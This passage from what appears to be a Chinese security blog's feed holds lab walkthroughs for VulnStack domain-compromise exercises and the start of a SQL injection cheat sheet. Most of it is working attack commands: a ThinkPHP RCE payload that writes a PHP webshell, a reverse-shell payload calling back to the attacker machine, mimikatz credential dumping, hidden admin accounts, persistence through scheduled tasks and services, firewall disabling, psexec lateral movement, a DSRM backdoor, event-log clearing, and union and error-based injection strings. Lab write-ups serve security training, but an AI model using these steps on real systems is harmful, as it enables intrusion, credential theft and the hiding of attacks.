off</span><br></pre></td></tr></table></figure><ul><li>密码抓取</li></ul><p>接下来提权到system权限,利用<code>getsystem</code>即可, 可以得到Administrator的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all// 抓取全部</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428204429662.png" alt="image-20240428204429662"></p><h2 id="内网渗透"><a class="header-anchor" href="#内网渗透">¶</a>内网渗透</h2><h3 id="搭建路由和代理"><a class="header-anchor" href="#搭建路由和代理">¶</a>搭建路由和代理</h3><p>先添加通向<code>192.168.52.0</code>内网的路由</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route add 192.168.52.0 255.255.255.0 1// 数字是会话序号</span><br><span class="line">route print</span><br></pre></td></tr></table></figure><p>利用msf搭建socks代理</p><blockquote><p>socks代理仅仅是为了代理工具,如果仅用msf进行操作,不需要搭建</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set version 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="横向移动"><a class="header-anchor" href="#横向移动">¶</a>横向移动</h3><p>利用<code>fscan</code>进行扫描或者用<code>proxychains</code>代理扫描工具</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan64.exe -h 192.168.52.130</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502110334723.png" alt="image-20240502110334723"></p><p>终究还是败给了cs的好用</p><p>首先上传cs木马, 监听和连接,这里不在赘述,记得会话<strong>设置sleep为1</strong>,否则等半天</p><ul><li>搭建SMB Beacon</li></ul><blockquote><p>SMB Beacon使用windows管道进行通信,可以把以此为枢纽,进行内外网的流量转发</p></blockquote><p>新建监听器, 选择payload为<code>Beacon SMB</code>,随便取名,我的取名为<code>smb</code></p><p>然后在要建立<code>SMB Beacon</code>的beacon对话框中输入<code>spawn [name]</code>如下图,我在红色箭头的会话中输入了<code>spawn smb</code>,它的右侧就会多出来一个</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502183537269.png" alt="image-20240502183537269"></p><p>我发现这里连不上另一个域成员却可以直接用psexec登录域控,这下坏了</p><p>算了,就在这里结束吧,毕竟可以直接利用抓到的令牌进行psexec横向移动,给出步骤:</p><p>切换视图然后右键,选择psexec</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502194355001.png" alt="image-20240502194355001"></p><p>然后选择令牌,令牌看上去似乎很少或者没有就去抓取明文密码和抓取hash</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502194803642.png" alt="image-20240502194803642"></p><p>监听器就选创建的smb和新出现的会话, <strong>注意这个OWA才是域控</strong>,看ip分辨</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502194854310.png" alt="image-20240502194854310"></p><p>运行即可,一般出现<code>established link to child beacon: ip</code>就算成功,ip是谁创建的会话就是谁,不放心可以用<code>shell ipconfig</code>验证</p><p>如下,原来的图新增一个会话,然后ip也正确,我们已经拿下域控了</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502195104610.png" alt="image-20240502195104610"></p><blockquote><p>下面都是乱走的路,在此处没用</p><p>假如你想看全程用msf利用psexec登录域控的,去看<code>vulnstack红队5</code>,但是msf不是很稳定</p></blockquote><p>利用telnet攻击:</p><p>开放了445端口,扫出了MS17-010漏洞,尝试利用(换了好几个payload,这个行,可能是才疏学浅)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set command net user// 此处为要执行的命令</span><br><span class="line">set rhost 192.168.52.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>可以执行命令就可以转变为建立一个用户然后用telnet连接或者利用3389远程连接</p><blockquote><p>虽然telnet只能上传文件不能执行,但是可以通过msf执行然后反弹shell</p><p>再或者利用msf的模块直接建立会话</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set command net user test hack@2024 /add// 新建用户,密码不能太简单,不能包含用户名</span><br><span class="line">set command net localgroup administrators test /add// 加入管理员组,最好再看一眼用户列表</span><br><span class="line">set command sc config tlntsvr start= auto// 打开telnet服务</span><br><span class="line">set command net start telnet// 启动</span><br><span class="line">set command netstat -an// 查看端口开启(23)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502120731187.png" alt="image-20240502120731187"></p><p>尝试msf的telnet模块连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_login</span><br><span class="line">set rhosts 192.168.52.130</span><br><span class="line">set username test</span><br><span class="line">set password hack@2024</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502123330580.png" alt="image-20240502123330580"></p><p>连接后这个session似乎不能执行命令,我猜测是因为这个模块是针对linux的,因为在尝试利用python,python3,script,socat等等进行会话建立</p><p>手动进行telnet连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains telnet 192.168.52.130</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
            <tag> Kali </tag>
            
            <tag> 内网 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack-红日5</title>
      <link href="/article/vulnstack-5/"/>
      <url>/article/vulnstack-5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>vulnstack红队5</h1><p><strong>拍快照,拍快照,拍快照!</strong>, 如果要remake没有快照你就偷着乐吧</p><blockquote><p>来源: <a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">vulnstack红队5</a></p><p>目标: 拿到域控</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>本次是自己配置的环境, 密码已经被修改过了, 原密码如下:</p><ul><li>win7: <code>sun\heart 123.com</code> &amp; <code>sun\Administrator dc123.com</code></li><li>2008: <code>sun\admin 2020.com</code></li></ul><blockquote><p>此处<code>sun\admin</code>指的是sun域下的admin账户</p></blockquote><h3 id="网络配置"><a class="header-anchor" href="#网络配置">¶</a>网络配置</h3><p>win7靶机需要你自己上去开启php环境, 以下是我配置的ip地址和密码:</p><p>新增两个虚拟网络:</p><ul><li>192.168.135.0/24 外网环境(Vmnet1)</li><li>192.168.138.0/24 内网环境(Vmnet2)</li></ul><h3 id="靶机配置"><a class="header-anchor" href="#靶机配置">¶</a>靶机配置</h3><p><strong>win7</strong></p><ul><li>外网地址 192.168.135.150</li><li>内网地址 192.168.138.136</li><li>账号密码 sun\Administrator <a href="http://dc321.com">dc321.com</a></li></ul><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406163415716.png" alt="image-20240406163415716"></p><p><strong>win2008</strong></p><ul><li>内网地址 192.168.138.138</li><li>账号密码 sun\admin <a href="http://2024.com">2024.com</a></li></ul><p><strong>kali</strong></p><ul><li>外网地址 192.168.135.128</li></ul><blockquote><p>攻击机也要放在这个网段下, 否则反弹shell出不来</p><p>简而言之, 就是win7靶机<em>能ping通剩下的两台机器</em>(有人没配好就开始做了,我不说是谁)</p></blockquote><h2 id="外网渗透"><a class="header-anchor" href="#外网渗透">¶</a>外网渗透</h2><h3 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h3><p>访问<code>192.168.135.150</code>, 发现是<code>thinkphp</code>, 版本为<code>V5.0.22</code>; 这个版本有远程 RCE 漏洞, 可以写一句话木马然后蚁剑连接</p><blockquote><p>使用工具可以跳过手工getshell的步骤</p></blockquote><h3 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h3><p>蚁剑需要自己配置到kali中</p><p>利用payload进行getshell:</p><blockquote><p>经过目录扫描可以得到已经有了一个 <code>add.php</code> 木马在网站目录, 密码经过爆破是 <code>admins</code></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"><span class="comment"># 查看 phpinfo, 可以获得站点目录 C:/phpStudy/PHPTutorial/WWW/public</span></span><br><span class="line"></span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">echo</span>%20^%3C?php%20@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[%27shell%27]);%20?^%3E%20%3E%20shell.php</span><br><span class="line"><span class="comment"># 写入一句话木马, 蚁剑连接</span></span><br><span class="line"></span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1]</span><br><span class="line">[]= <span class="built_in">echo</span> ^&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]);?^&gt; &gt; <span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="comment"># 其中^来把特殊字符&lt;等转义</span></span><br></pre></td></tr></table></figure><p>该一句话木马生成在根目录, 直接用蚁剑连接就好, 连接url如下, 密码为shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.135.150/shell.php</span><br></pre></td></tr></table></figure><h2 id="内网渗透"><a class="header-anchor" href="#内网渗透">¶</a>内网渗透</h2><h3 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h3><p>蚁剑右键<strong>在此处打开终端</strong></p><p>查看本机信息,可以知道我们的权限是<code>administrator</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span>          <span class="comment"># 查看当前用户</span></span><br><span class="line">ipconfig /all<span class="comment"># 查看网络信息, 本机ip,所在域</span></span><br><span class="line">net user /domain         <span class="comment"># 查看域用户  admin, Administrator, Guest, krbtgt, leo</span></span><br></pre></td></tr></table></figure><p>有两个网段, 本地连接2明显就是攻击机和我们刚打的靶机的 ip, 那么 <code>以太网适配器 wk1</code> 应该是内网, 与我们不相通, 处于一个域DNS名称为<code>sun.com</code>的域中</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406180051412.png" alt="image-20240406180051412"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view /domain         // 查看有几个域, 本实验无回显</span><br><span class="line">net config workstation   // 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br></pre></td></tr></table></figure><p>现在知道是在<code>SUN</code>域中了</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240426221321975.png" alt="image-20240426221321975"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a// 查看arp缓存</span><br></pre></td></tr></table></figure><p>可以看得到有两个网段, 以及可能存活的主机</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406171007966.png" alt="image-20240406171007966"></p><p>既然知道了域DNS名称, 可以通过 ping 的方式查找主控</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping sun.com</span><br><span class="line">// nslookup sun.com</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406181740334.png" alt="image-20240406181740334"></p><p>所以, 我们可以得到的信息是</p><ol><li>当前用户直接就是<code>administrator</code>, 管理员账户</li><li>目标主机所在的网络环境还存在一个<code>192.168.138.0</code>的网段, 域控主机为<code>192.168.138.138</code></li><li>当前的用户权限不能收集域信息, ( 据说可以用低权限用户来进行域信息收集 )</li></ol><p><strong>用msf继续后面操作: </strong></p><p>生成msf木马后通过蚁剑上传, 设置对应监听后用蚁剑命令行运行以连接( 直接输入<code>shell.exe</code>运行msf木马 )</p><blockquote><p>如果上传到网站目录下msf可能会偶尔断开连接,而似乎在启动项目录或C盘根目录下没有这个问题(其余没有测试)</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.135.128 lport=10000  -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p>连接后使用<code>getsystem</code>提权, 成功得到SYSTEM权限</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406175057495.png" alt="image-20240406175057495"></p><p>或者将该木马传入目标机的启动项, 每次启动如果还在监听则会连接, 目录如下:</p><ul><li><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></li><li><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup</code></li></ul><p>对主机进行密码抓取</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">load kiwi<span class="comment"># 启动kiwi, 实际是mimikatz工具</span></span><br><span class="line">creds_all<span class="comment"># 抓取全部</span></span><br></pre></td></tr></table></figure><p>成功抓取到域管理员<code>Administrator</code>密码: <code>dc321.com</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406181315902.png" alt="image-20240406181315902"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">migrate 324<span class="comment"># 迁移Metasploit会话到另一个进程(PID)</span></span><br></pre></td></tr></table></figure><blockquote><p>可能直接用mimikatz的时候不能运行, 原因是<strong>进程非64位</strong>, 需要迁移我们的会话到一个64位进程的程序上</p><p>如果你实在不知道怎么搞, 你就检查上传的msf木马是不是x64, 如果不是, 重传一个x64的msf木马就可以了</p></blockquote><p>其余信息收集:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># meterpreter下</span></span><br><span class="line">hashdump<span class="comment"># 抓取账号和密码哈希值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shell下</span></span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain<span class="comment"># 查看域内主机  WIN7$</span></span><br><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain<span class="comment"># 查看域控制器  DC$</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain<span class="comment"># 查看域管理员  Administrator, 即我们 shell 登录的用户权限</span></span><br><span class="line"><span class="comment"># 如果返回大多数是乱码, 执行 chcp 65001更换编码方式</span></span><br></pre></td></tr></table></figure><h3 id="可跳过"><a class="header-anchor" href="#可跳过">¶</a>可跳过</h3><p>其实在这里可以关闭win7防火墙, 创建隐藏用户, 打开远程服务, 命令如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># win7的shell下</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line">net user <span class="built_in">test</span>$ admin123! /add </span><br><span class="line">net localgroup administrators <span class="built_in">test</span>$ /add<span class="comment"># 添加到管理员组</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240426224317660.png" alt="image-20240426224317660"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># meterpreter下</span></span><br><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240426223258462.png" alt="image-20240426223258462"></p><p>然后就可以用远程桌面连接了, 用刚抓取的密码或新建的用户即可登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop 192.168.135.150</span><br></pre></td></tr></table></figure><p>如果是正常攻击, 我们可以塞几个计划任务, 自启动服务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn <span class="built_in">test</span> /sc minute /mo 1 /tr C:/ProgramData/Microsoft/Windows/Start_Menu/Programs/Startup/win_shell.exe /ru system /f</span><br><span class="line"><span class="comment"># 计划任务</span></span><br><span class="line"></span><br><span class="line">sc create <span class="string">&quot;badserver&quot;</span> binpath= <span class="string">&quot;C:/ProgramData/Microsoft/Windows/Start_Menu/Programs/Startup/win_shell.exe&quot;</span></span><br><span class="line">sc description <span class="string">&quot;badserver&quot;</span> <span class="string">&quot;badserver&quot;</span><span class="comment"># 设置服务描述</span></span><br><span class="line">sc config <span class="string">&quot;badserver&quot;</span> start= auto <span class="comment"># 设置为自启动</span></span><br><span class="line">net start <span class="string">&quot;badserver&quot;</span> <span class="comment"># 启动服务</span></span><br></pre></td></tr></table></figure><p><strong>下面不可跳过</strong></p><h3 id="横向移动"><a class="header-anchor" href="#横向移动">¶</a>横向移动</h3><p>尝试攻击域控, 首先在msf添加一个通向<code>192.168.138.0</code>的路由, 在payload选择界面输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">route add 192.168.138.0 255.255.255.0 1// 这个1是会话序号</span><br><span class="line">route <span class="built_in">print</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406223330346.png" alt="image-20240406223330346"></p><p>msf搭建socks代理</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> srvhost 127.0.0.1</span><br><span class="line"><span class="built_in">set</span> version 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>然后配置<code>proxychains</code>, 将socks5服务器指向<code>127.0.0.1:1080</code>, 之后便可以使用proxychains将我们的程序代理进内网</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf<span class="comment"># 可能会有不同</span></span><br><span class="line"><span class="comment"># 将socks4 127.0.0.1 9095改为socks5 127.0.0.1 1080</span></span><br><span class="line"><span class="comment"># vim编辑ReadOnly不能保存? 退出编辑模式后输入:w !sudo tee %进行保存，之后再使用:q!退出即可</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427104145736.png" alt="image-20240427104145736"></p><p>给win7上传<code>fscan</code>工具对域控主机进行端口和存活主机扫描, 这一步可以直接用<code>proxychains</code>代理执行nmap命令代替(好慢)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fscan64.exe -h 192.168.138.138</span><br><span class="line"><span class="comment"># proxychains nmap -p 50-500 192.168.138.138</span></span><br></pre></td></tr></table></figure><p>本目录下就会多出result.txt:可以得到域控主机开启了端口445,135,88,139</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406215540986.png" alt="image-20240406215540986"></p><p>如果是nmap的话就是这样, 如果响应端口扫不出来, 那就是代理配置有问题或者sessions挂了, remake</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427111109859.png" alt="image-20240427111109859"></p><h3 id="攻击域控"><a class="header-anchor" href="#攻击域控">¶</a>攻击域控</h3><p><code>psexec</code>登录域控通常是要求防火墙关闭的, 所以我们利用sc通过创建服务来远程执行, 关闭Windows 2008的防火墙</p><p>在 Windows 7 的 shell 上执行(可能要稍微等一下, 完成了之后瞄一眼dc):</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net use \\192.168.138.138\ipc$ <span class="string">&quot;dc321.com&quot;</span> /user:<span class="string">&quot;administrator&quot;</span></span><br><span class="line"><span class="comment"># 让其与 Windows 2008建立 ipc$ 连接</span></span><br><span class="line">sc \\192.168.138.138 create unablefirewall binpath= <span class="string">&quot;netsh advfirewall set allprofiles state off&quot;</span></span><br><span class="line"><span class="comment"># 创建关闭防火墙的服务</span></span><br><span class="line">sc \\192.168.138.138 start unablefirewall</span><br><span class="line"><span class="comment"># 立即启动服务</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406185147859.png" alt="image-20240406185147859"></p><p>既然已经获得了域管理员的用户名密码且域控防火墙已经被关闭了，那么我们直接尝试使用psexec登录域控</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.138.138</span><br><span class="line"><span class="built_in">set</span> SMBDomain SUN</span><br><span class="line"><span class="built_in">set</span> SMBUser administrator</span><br><span class="line"><span class="built_in">set</span> SMBPass dc321.com</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240407153645227.png" alt="image-20240407153645227"></p><blockquote><p>连不上就重启msf然后重新连接和配置路由, remake解决大部分问题</p><p>重启msf也连不上?那么你的快照就有用了, 全部恢复/重启(包括kali), 省略所有信息收集部分即可</p></blockquote><p>看到这个就可以跑了</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427115707394.png" alt="image-20240427115707394"></p><p>开启Windows 2008远程桌面</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use post/windows/manage/enable_rdp</span><br><span class="line"><span class="built_in">set</span> session 2<span class="comment"># background自己找序号, 是psexec登录的那个</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240407153952245.png" alt="image-20240407153952245"></p><p>之前已经配置过了<code>proxychains</code>,可以直接连接远程桌面了, 选项都选yes</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop 192.168.138.138</span><br><span class="line"><span class="comment"># 账号密码分别为SUN\Administratordc321.com</span></span><br><span class="line"><span class="comment"># 即我们之前抓到的账号密码</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240407154345983.png" alt="image-20240407154345983"></p><h3 id="DSRM后门-直接跳过-我没搞懂"><a class="header-anchor" href="#DSRM后门-直接跳过-我没搞懂">¶</a>DSRM后门(直接跳过,我没搞懂)</h3><blockquote><p>这部分在有远程桌面的时候好做</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ntdsutil<span class="comment"># 进入ntdsutil</span></span><br><span class="line"><span class="built_in">set</span> dsrm password<span class="comment"># 设置 DSRM 账户的密码</span></span><br><span class="line">reset password on server null<span class="comment"># 在当前域控制器上恢复 DSRM 密码</span></span><br><span class="line"><span class="comment"># 输入两次新密码</span></span><br><span class="line">q<span class="comment"># 退出</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427124609542.png" alt="image-20240427124609542"></p><p>随后修改域控主机的DSRM账户登录方式:在Windows Server 2000以后的版本操作系统中, 对DSRM使用控制台登录域控制器进行了限制。我们可以在注册表的<code>HKLM:\System\CurrentControlSet\Control\Lsa\</code>中新建<code>DsrmAdminLogonBehavior</code>项进行设置，将该新建的项中的值设为0, 1, 2可以分别设置不同的DSRM账户登录方式</p><ul><li>0:  只有当域控制器重启并进入DSRM模式的时候才可以使用DSRM管理员账号登录域控制器</li><li>1:  只有当本地AD,DS服务停止才能登录</li><li>2:  任何情况下都能登录</li></ul><p>我们需要将值设置为2, 手动进入注册表新建也可, 以下是命令方式</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">New-ItemProperty <span class="string">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -name &quot;</span>DsrmAdminLogonBehavior<span class="string">&quot; -value 2 -propertyType DWORD</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427125805363.png" alt="333"></p><p>现在我们可以在域成员主机Windows7上通过工具, 使用域控制器的本地Administrator账号哈希传递攻击域控了</p><p>可以用meterpreter在<code>load kiwi</code>后执行<code>lsa_dump_sam</code>来获取哈希值</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427131133377.png" alt="image-20240427131133377"></p><h3 id="日志清理"><a class="header-anchor" href="#日志清理">¶</a>日志清理</h3><p>有远程桌面的权限时手动删除日志：</p><p>开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志</p><p>或win+R, 输入<code>eventvwr</code>进入日志查看器, 右键清除</p><p>命令执行方式清除:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PowerShell -Command <span class="string">&quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>meterpreter自带清除日志功能</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clearev   <span class="comment"># 清除Windows中的应用程序日志，系统日志安全日志</span></span><br><span class="line"></span><br><span class="line">run event_manager -i<span class="comment"># 查看事件日志</span></span><br><span class="line">run event_manager -c<span class="comment"># 清除事件日志</span></span><br></pre></td></tr></table></figure><blockquote><p>利用earthworm搭建socks5反向代理, 将对应文件上传到对应机器( 不是本次实验内容 )</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 7890<span class="comment"># 攻击机</span></span><br><span class="line">ew_for_Win.exe -s rssocks -d 192.168.135.128 -e 7890<span class="comment"># win7靶机连接攻击机 ip</span></span><br><span class="line">start ew_for_Win.exe -s rssocks -d 192.168.135.128 -e 7890 /b<span class="comment"># 可以换成这个, 这个是进行后台执行</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240407124724745.png" alt="image-20240407124724745"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
            <tag> Kali </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/article/sql-injection/"/>
      <url>/article/sql-injection/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>SQL注入介绍</h1><hr><p>本质为因为网站对用户输入没有进行充分过滤(过于信任), 导致的sql语句拼接并查询数据库得到了敏感信息</p><p>建议学一些数据库语句, 浅尝即止, 能看得懂下面的语句就可以了</p><h1>注入方式</h1><h2 id="union-联合注入"><a class="header-anchor" href="#union-联合注入">¶</a>union 联合注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 判断列数</span><br><span class="line">-1&#x27; order by 4 --</span><br><span class="line"></span><br><span class="line"># 判断显示位</span><br><span class="line">-1&#x27; union select 1,2,3 --</span><br><span class="line">// 假如未出现 123 尝试查看下一行</span><br><span class="line">-1&#x27; union select 1,2,3 limit 1,1 --</span><br><span class="line"></span><br><span class="line"># 查询数据库名</span><br><span class="line">-1&#x27; union select 1,database(),3 --</span><br><span class="line"># 查询所有数据库名</span><br><span class="line">-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata), 3 --</span><br><span class="line"></span><br><span class="line"># 查询数据库内表名</span><br><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),3 --</span><br><span class="line"># 或</span><br><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;database_name&#x27;,3 --</span><br><span class="line"></span><br><span class="line"># 查询此表内字段名</span><br><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;table_name&#x27;,3 --</span><br><span class="line"></span><br><span class="line"># 查询字段内容</span><br><span class="line">-1&#x27; union select 1,group_concat(id,flag) from table_name,3 --</span><br></pre></td></tr></table></figure><h2 id="报错注入"><a class="header-anchor" href="#报错注入">¶</a>报错注入</h2><p>什么时候使用报错注入：</p><p>查询无回显位, 或者源代码中有输出错误的代码的时候, 使用报错注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 检查是否有正常回显, 漏洞验证</span><br><span class="line">1&#x27; and updatexml(1,&#x27;~&#x27;,3) --</span><br><span class="line"></span><br><span class="line"># 获取所有数据库</span><br><span class="line">-1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr((select group_concat(schema_name)from information_schema.schemata), 1 , 31)),3) --</span><br><span class="line"></span><br><span class="line"># 获取当前数据库名</span><br><span class="line">-1&#x27; and updatexml(1,concat(&#x27;~&#x27;,database()),3) --</span><br><span class="line"></span><br><span class="line"># 获取数据库内表</span><br><span class="line">-1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr((select group_concat(table_name)from information_schema.tables where table_schema = &#x27;database_name&#x27;), 1 , 31)),3) --</span><br><span class="line"></span><br><span class="line"># 获取表内字段</span><br><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr((select group_concat(column_name)from information_schema.columns where table_schema = &#x27;database_name&#x27; and table_name = &#x27;table_name&#x27;), 1 , 31)),3) --</span><br><span class="line"></span><br><span class="line"># 获取表内信息</span><br><span class="line">-1&#x27;and 